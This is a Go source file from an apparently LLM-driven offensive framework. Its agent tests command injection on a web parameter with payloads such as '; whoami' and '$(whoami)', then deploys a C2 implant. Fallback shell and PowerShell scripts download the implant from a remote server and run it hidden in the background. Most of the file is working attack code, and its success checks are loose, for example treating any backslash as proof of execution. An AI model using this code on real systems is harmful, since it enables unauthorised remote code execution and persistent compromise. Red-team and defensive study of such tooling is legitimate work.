package specialist

import (
	"cal-project/internal/brain/llm"
	"cal-project/internal/core/agent"
	"cal-project/internal/core/bus"
	"cal-project/internal/hands/scripts"
	"cal-project/internal/hands/tools"
	"cal-project/internal/hands/trt"
	"context"
	"fmt"
	"log"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync/atomic"
	"time"
)

var cmdiMessageCounter atomic.Uint64

// CommandInjectionSpecialist deploys CallistoAgent through existing agents via TRT API
type CommandInjectionSpecialist struct {
	id           string
	bus          bus.Bus
	brain        llm.LLM
	ctx          context.Context
	trtClient    *trt.Client
	agentPaw     string // Agent PAW to use for deployment
	platform     string // Platform of the agent (windows/linux)
	agentServer  string // TRT server URL for agent download
	scriptLoader *scripts.Loader
}

// NewCommandInjectionSpecialist creates a new CommandInjectionSpecialist
func NewCommandInjectionSpecialist(ctx context.Context, id string, eventBus bus.Bus, llmClient llm.LLM, trtClient *trt.Client, agentPaw string, platform string) *CommandInjectionSpecialist {
	agentServer := os.Getenv("TRT_API_URL")
	if agentServer == "" {
		agentServer = "http://192.168.50.10"
	}

	return &CommandInjectionSpecialist{
		id:           id,
		bus:          eventBus,
		brain:        llmClient,
		ctx:          ctx,
		trtClient:    trtClient,
		agentPaw:     agentPaw,
		platform:     platform,
		agentServer:  agentServer,
		scriptLoader: scripts.NewLoader(""),
	}
}

func (c *CommandInjectionSpecialist) ID() string {
	return c.id
}

func (c *CommandInjectionSpecialist) Type() agent.AgentType {
	return agent.Specialist
}

func (c *CommandInjectionSpecialist) Run() error {
	log.Printf("[%s] Online. Agent Deployment Specialist using PAW: %s (platform: %s)\n", c.id, c.agentPaw, c.platform)
	return nil
}

func (c *CommandInjectionSpecialist) OnEvent(event bus.Event) {
	if event.Type == bus.Command && event.ToAgent == c.id {
		log.Printf("[%s] Received command: %v\n", c.id, event.Payload)
		go c.executeTask(event)
	}
}

// executeTask performs the agent deployment via TRT API
func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
	taskDesc, ok := cmdEvent.Payload.(string)
	if !ok {
		log.Printf("[%s] Invalid task payload\n", c.id)
		return
	}

	log.Printf("[%s] Executing: %s\n", c.id, taskDesc)

	if c.trtClient == nil {
		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: TRT Client not available")
		return
	}

	if c.agentPaw == "" {
		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: No agent PAW specified")
		return
	}

	// ============================================================================
	// P1: Verify RCE first before deploying agent
	// ============================================================================
	targetURL, parameter := c.extractTaskInfo(taskDesc)

	if targetURL != "" && parameter != "" {
		log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
		verified, payload := c.verifyRCE(targetURL, parameter)

		if !verified {
			log.Printf("[%s] ⚠️ RCE verification failed - aborting agent deployment\n", c.id)
			c.reportObservation(cmdEvent.FromAgent, "RCE verification failed - false positive, deployment aborted")
			return
		}

		log.Printf("[%s] ✅ RCE verified with payload: %s\n", c.id, payload)
		evidence := fmt.Sprintf("Command execution confirmed with payload: %s", payload)
		c.reportVerifiedRCE(targetURL, payload, evidence)
	} else {
		log.Printf("[%s] ⚠️ No target URL/parameter extracted, proceeding with deployment without verification\n", c.id)
	}

	// Deploy agent using TRT API
	log.Printf("[%s] Deploying CallistoAgent via TRT API...\n", c.id)
	success, linkID := c.deployAgent()

	// Generate report
	report := c.generateReport(success, linkID)
	c.reportObservation(cmdEvent.FromAgent, report)
}

// deployAgent deploys CallistoAgent on the target host via TRT API
func (c *CommandInjectionSpecialist) deployAgent() (bool, string) {
	// Build agent URL based on platform
	var agentURL string
	switch strings.ToLower(c.platform) {
	case "windows":
		agentURL = fmt.Sprintf("%s/agents/windows", c.agentServer)
	case "linux":
		agentURL = fmt.Sprintf("%s/agents/linux", c.agentServer)
	default:
		log.Printf("[%s] Unknown platform: %s, defaulting to linux\n", c.id, c.platform)
		agentURL = fmt.Sprintf("%s/agents/linux", c.agentServer)
	}

	// Get default agent path
	agentPath := scripts.GetDefaultAgentPath(c.platform)

	// Load deployment script from assets/scripts
	script, err := c.scriptLoader.GetDeployAgentScript(c.platform, agentURL, agentPath)
	if err != nil {
		log.Printf("[%s] Failed to load deployment script: %v\n", c.id, err)
		// Fallback to inline script
		script = c.getFallbackScript(agentURL, agentPath)
	}

	log.Printf("[%s] Deployment script loaded for platform: %s\n", c.id, c.platform)
	log.Printf("[%s] Agent URL: %s\n", c.id, agentURL)
	log.Printf("[%s] Agent Path: %s\n", c.id, agentPath)

	// Get appropriate executor
	executor := scripts.GetExecutorForPlatform(c.platform)

	// Execute via TRT API
	log.Printf("[%s] Executing deployment via TRT API (paw: %s, executor: %s)\n", c.id, c.agentPaw, executor)

	linkID, err := c.trtClient.RunCommand("0", c.agentPaw, c.platform, executor, script)
	if err != nil {
		log.Printf("[%s] TRT command execution failed: %v\n", c.id, err)
		return false, ""
	}

	log.Printf("[%s] Deployment command sent, link_id: %s\n", c.id, linkID)

	// Wait for result (with timeout)
	result, err := c.waitForResult(linkID, 60*time.Second)
	if err != nil {
		log.Printf("[%s] Failed to get deployment result: %v\n", c.id, err)
		return false, linkID
	}

	if result != nil && result.Success {
		log.Printf("[%s] Deployment command executed successfully\n", c.id)
		return true, linkID
	}

	log.Printf("[%s] Deployment may have issues, check agent registration\n", c.id)
	return true, linkID // Return true since command was sent
}

// waitForResult polls for command execution result
func (c *CommandInjectionSpecialist) waitForResult(linkID string, timeout time.Duration) (*trt.CommandResult, error) {
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		result, err := c.trtClient.GetCommandResult(linkID)
		if err != nil {
			log.Printf("[%s] Error polling result: %v\n", c.id, err)
			time.Sleep(2 * time.Second)
			continue
		}

		if result != nil {
			return result, nil
		}

		time.Sleep(2 * time.Second)
	}

	return nil, fmt.Errorf("timeout waiting for result")
}

// getFallbackScript returns an inline deployment script when loader fails
func (c *CommandInjectionSpecialist) getFallbackScript(agentURL, agentPath string) string {
	if strings.ToLower(c.platform) == "windows" {
		return fmt.Sprintf(`$agentUrl = "%s"
$agentPath = "%s"
Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath -UseBasicParsing
Start-Process -FilePath $agentPath -WindowStyle Hidden`, agentURL, agentPath)
	}

	// Linux fallback
	return fmt.Sprintf(`AGENT_URL="%s"
AGENT_PATH="%s"
curl -s -o "$AGENT_PATH" "$AGENT_URL" || wget -q -O "$AGENT_PATH" "$AGENT_URL"
chmod +x "$AGENT_PATH"
nohup "$AGENT_PATH" > /dev/null 2>&1 &`, agentURL, agentPath)
}

func (c *CommandInjectionSpecialist) generateReport(success bool, linkID string) string {
	report := "=== AGENT DEPLOYMENT REPORT ===\n\n"
	report += fmt.Sprintf("Agent PAW: %s\n", c.agentPaw)
	report += fmt.Sprintf("Platform: %s\n", c.platform)
	report += fmt.Sprintf("Agent Server: %s\n\n", c.agentServer)

	if success {
		report += "--- Deployment Status ---\n"
		report += "Status: DEPLOYMENT COMMAND SENT\n"
		if linkID != "" {
			report += fmt.Sprintf("Link ID: %s\n", linkID)
		}
		report += "\nNote: Check TRT for new agent registration\n"
		report += "The new agent should beacon within 10 seconds if deployment was successful.\n"
	} else {
		report += "--- Deployment Status ---\n"
		report += "Status: DEPLOYMENT FAILED\n"
		report += "Reason: Could not execute deployment command via TRT API\n"
	}

	return report
}

func (c *CommandInjectionSpecialist) reportObservation(toAgent string, observation string) {
	msgID := cmdiMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-obs-%d", c.id, msgID),
		FromAgent: c.id,
		ToAgent:   toAgent,
		Type:      bus.Observation,
		Payload:   observation,
	}
	c.bus.Publish(toAgent, event)
}

// ============================================================================
// RCE Verification Functions (P1 Implementation)
// ============================================================================

// extractTaskInfo parses task description to extract target URL and parameter
// Expected format: "Deploy ... (target context: http://example.com?cmd=test)"
func (c *CommandInjectionSpecialist) extractTaskInfo(taskDesc string) (targetURL string, parameter string) {
	// Extract URL from "target context: URL"
	re := regexp.MustCompile(`target context:\s*([^\s)]+)`)
	matches := re.FindStringSubmatch(taskDesc)
	if len(matches) < 2 {
		return "", ""
	}

	fullURL := matches[1]

	// Parse URL to extract parameter
	parsedURL, err := url.Parse(fullURL)
	if err != nil {
		log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
		return "", ""
	}

	// Get query parameters
	queryParams := parsedURL.Query()
	for param := range queryParams {
		// Return base URL and first parameter found
		baseURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parsedURL.Path)
		return baseURL, param
	}

	return fullURL, ""
}

// verifyRCE attempts to verify command injection by executing test commands
// Returns (success, payload) if RCE is confirmed
func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string) {
	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)

	// Determine payloads based on platform
	var payloads []string
	if strings.ToLower(c.platform) == "windows" {
		payloads = []string{
			"& whoami",
			"| whoami",
			"&& whoami",
			"; whoami",
		}
	} else {
		// Linux payloads
		payloads = []string{
			"; whoami",
			"| id",
			"$(whoami)",
			"`whoami`",
			"&& id",
		}
	}

	// Create executor (use TRT remote executor)
	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)

	for _, payload := range payloads {
		log.Printf("[%s] Testing payload: %s\n", c.id, payload)

		// Build test URL
		testURL, err := url.Parse(targetURL)
		if err != nil {
			log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
			continue
		}

		queryParams := testURL.Query()
		queryParams.Set(parameter, payload)
		testURL.RawQuery = queryParams.Encode()

		// Execute HTTP request
		response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
		if err != nil {
			log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
			continue
		}

		// Check for command execution indicators
		lowerResponse := strings.ToLower(response)
		if strings.Contains(lowerResponse, "root") ||
			strings.Contains(lowerResponse, "www-data") ||
			strings.Contains(lowerResponse, "uid=") ||
			strings.Contains(lowerResponse, "gid=") ||
			strings.Contains(response, "nt authority") ||
			strings.Contains(response, "\\") { // Windows path indicator

			log.Printf("[%s] ✅ RCE verified! Response contains: %s\n", c.id, response[:100])
			return true, payload
		}
	}

	return false, ""
}

// reportVerifiedRCE publishes a Finding event to Reporter
func (c *CommandInjectionSpecialist) reportVerifiedRCE(targetURL string, payload string, evidence string) {
	finding := map[string]interface{}{
		"type":        "CommandInjection",
		"url":         targetURL,
		"payload":     payload,
		"severity":    "High",
		"description": fmt.Sprintf("Verified CommandInjection vulnerability. \nEvidence: %s", evidence),
		"timestamp":   time.Now().Format(time.RFC1123),
	}

	msgID := cmdiMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-finding-%d", c.id, msgID),
		FromAgent: c.id,
		ToAgent:   "BROADCAST",
		Type:      bus.Finding,
		Payload:   finding,
	}
	c.bus.Publish("Reporter-01", event)

	log.Printf("[%s] ✅ Verified RCE: CommandInjection at %s\n", c.id, targetURL)
}
